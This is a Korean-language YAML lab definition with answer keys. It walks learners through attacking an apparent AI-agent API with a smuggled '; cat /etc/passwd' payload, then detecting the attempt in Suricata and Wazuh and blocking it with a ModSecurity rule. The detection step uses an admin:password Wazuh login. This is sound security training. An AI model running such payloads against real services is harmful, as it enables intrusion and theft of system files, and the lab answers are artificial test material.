lab_id: latest-CVE-NEWS-f8fad72b88-C10
title: Prompt Injection Vulnerability Lab - C10 AI Security Agent
version: ai
course: latest-threats
week: 0
description: 이 실습에서는 Microsoft Copilot 및 Salesforce Agentforce에서 보고된 프롬프트 주입 취약점을
  재현하고, Suricata와 Wazuh를 활용해 탐지하며, ModSecurity 규칙을 적용해 대응하는 과정을 학습합니다.
difficulty: medium
duration_minutes: 60
objectives:
- AI 에이전트 서비스가 실행 중인지 확인한다.
- 프롬프트 주입을 이용해 민감한 파일을 탈취한다.
- IDS/IPS와 SIEM을 통해 악의적인 요청을 탐지한다.
- 로그를 분석해 공격 흐름을 파악한다.
- ModSecurity 규칙을 적용해 취약점을 차단한다.
pass_threshold: 0.5
steps:
- order: 1
  instruction: Attacker VM에서 웹 서버의 포트 3000이 열려 있는지 확인하세요.
  hint: nmap을 사용해 특정 포트만 스캔합니다.
  category: recon
  points: 5
  answer: '프롬프트: nmap -p 3000 10.20.30.80'
  answer_detail: 포트 3000이 open 상태이면 취약한 AI 서비스가 실행 중임을 확인할 수 있습니다.
  verify:
    type: output_contains
    expect: 3000/tcp open
    field: stdout
  target_vm: attacker
  script: nmap -p 3000 10.20.30.80
  risk_level: low
  bastion_prompt: attacker VM에서 nmap 실행
- order: 2
  instruction: Attacker VM에서 AI 에이전트 API 엔드포인트에 HTTP GET 요청을 보내 상태 코드를 확인하세요.
  hint: curl -w "%{http_code}" 옵션을 사용합니다.
  category: scan
  points: 5
  answer: '프롬프트: curl -s -o /dev/null -w "%{http_code}" http://10.20.30.80:3000/api/agent'
  answer_detail: 200 응답이면 서비스가 정상 동작 중임을 의미합니다.
  verify:
    type: output_contains
    expect: '200'
    field: stdout
  target_vm: attacker
  script: curl -s -o /dev/null -w "%{http_code}" http://10.20.30.80:3000/api/agent
  risk_level: low
  bastion_prompt: attacker VM에서 curl 실행
- order: 3
  instruction: Attacker VM에서 프롬프트 주입을 시도하여 서버 내부 파일을 읽어보세요.
  hint: POST 요청에 악의적인 프롬프트를 포함합니다.
  category: exploit
  points: 15
  answer: '프롬프트: curl -s -X POST -H "Content-Type: application/json" -d ''{"prompt":";
    cat /etc/passwd"}'' http://10.20.30.80:3000/api/agent'
  answer_detail: 응답에 'root:x' 문자열이 포함되면 주입이 성공한 것입니다.
  verify:
    type: output_contains
    expect: root:x
    field: stdout
  target_vm: attacker
  script: 'curl -s -X POST -H "Content-Type: application/json" -d ''{"prompt":"; cat
    /etc/passwd"}'' http://10.20.30.80:3000/api/agent'
  risk_level: medium
  bastion_prompt: attacker VM에서 curl POST 실행
- order: 4
  instruction: Secu VM에서 Suricata 로그를 확인하여 의심스러운 POST 요청을 탐지하세요.
  hint: fast.log 파일을 grep으로 검색합니다.
  category: detect
  points: 10
  answer: '프롬프트: grep -i ''POST'' /var/log/suricata/fast.log | grep ''cat /etc/passwd'''
  answer_detail: ALERT 라인이 나타나면 Suricata가 주입 시도를 감지했음을 의미합니다.
  verify:
    type: output_contains
    expect: ALERT
    field: stdout
  target_vm: secu
  script: grep -i 'POST' /var/log/suricata/fast.log | grep 'cat /etc/passwd'
  risk_level: low
  bastion_prompt: secu VM에서 로그 검색
- order: 5
  instruction: SIEM VM에서 Wazuh를 이용해 최근 알림을 조회하고 프롬프트 주입 이벤트를 찾으세요.
  hint: Wazuh API를 curl로 호출합니다.
  category: analyze
  points: 10
  answer: '프롬프트: curl -s -u admin:password -X GET ''http://localhost:55000/alerts?pretty''
    | grep -i ''prompt injection'''
  answer_detail: 알림에 'prompt injection' 문자열이 있으면 SIEM이 이벤트를 수집했음을 확인합니다.
  verify:
    type: output_contains
    expect: prompt injection
    field: stdout
  target_vm: siem
  script: curl -s -u admin:password -X GET 'http://localhost:55000/alerts?pretty'
    | grep -i 'prompt injection'
  risk_level: low
  bastion_prompt: siem VM에서 Wazuh API 호출
- order: 6
  instruction: Web VM에서 ModSecurity 규칙을 추가/수정하여 해당 프롬프트 패턴을 차단하세요.
  hint: modsecurity.conf 파일에 SecRule을 삽입합니다.
  category: remediate
  points: 15
  answer: '프롬프트: echo "SecRule REQUEST_BODY \"; cat /etc/passwd\" \"id:1000001,phase:2,deny,status:403,msg:''Block
    prompt injection''\"" | sudo tee -a /etc/modsecurity/modsecurity.conf'
  answer_detail: 규칙이 적용되면 이후 주입 시도는 403 응답을 반환합니다.
  verify:
    type: output_contains
    expect: '1000001'
    field: stdout
  target_vm: web
  script: echo "SecRule REQUEST_BODY \"; cat /etc/passwd\" \"id:1000001,phase:2,deny,status:403,msg:'Block
    prompt injection'\"" | sudo tee -a /etc/modsecurity/modsecurity.conf
  risk_level: low
  bastion_prompt: web VM에서 ModSecurity 규칙 추가
- order: 7
  instruction: Attacker VM에서 다시 동일한 프롬프트 주입을 시도하고 차단 여부를 확인하세요.
  hint: 이전과 같은 curl 명령을 사용합니다.
  category: exploit
  points: 5
  answer: '프롬프트: curl -s -X POST -H "Content-Type: application/json" -d ''{"prompt":";
    cat /etc/passwd"}'' http://10.20.30.80:3000/api/agent'
  answer_detail: 응답에 '403' 혹은 'error'가 포함되면 방어가 성공한 것입니다.
  verify:
    type: output_contains
    expect: '403'
    field: stdout
  target_vm: attacker
  script: 'curl -s -X POST -H "Content-Type: application/json" -d ''{"prompt":"; cat
    /etc/passwd"}'' http://10.20.30.80:3000/api/agent'
  risk_level: low
  bastion_prompt: attacker VM에서 curl 재시도
